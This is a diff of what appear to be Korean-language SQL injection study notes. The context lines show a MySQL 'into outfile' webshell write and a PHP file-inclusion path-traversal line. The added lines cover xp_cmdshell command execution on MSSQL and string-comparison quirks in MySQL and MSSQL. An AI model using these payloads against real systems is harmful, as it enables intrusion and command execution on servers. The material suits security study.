@@ -35,5 +35,28 @@ select '<?=`ls`?>' into outfile '/tmp/a.php';
 /* <?php include $_GET['page'].'.php'; // "?page=../../../tmp/a" */
 
 
+Out of DBMS: MSSQL
+MSSQL에서는 xp_cmdshell기능을 이용해 os 명령어를 실행할 수 있다면
+SQL SEREVER 2005 버전이후는 비활성화되어 있어 임의로 활성화하지 않는 이상 불가능하다
+SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell' 
+EXEC xp_cmdshell "net user";
+EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
+
+
+MySQL의 대소문자 구분
+SELECT 'a'='A';
+1
+
+MSSQL
+SELECT 1 FROM test WHERE 'a'='A';
+
+
+MySQL 공백 문자로 끝나는 문자열 비교
+select 'a'='a ';
+1
+
+
+MySQL의 공백 문자로 끝나는 문자열 비교
+select 1 from test where 'a'='a ';
 
 
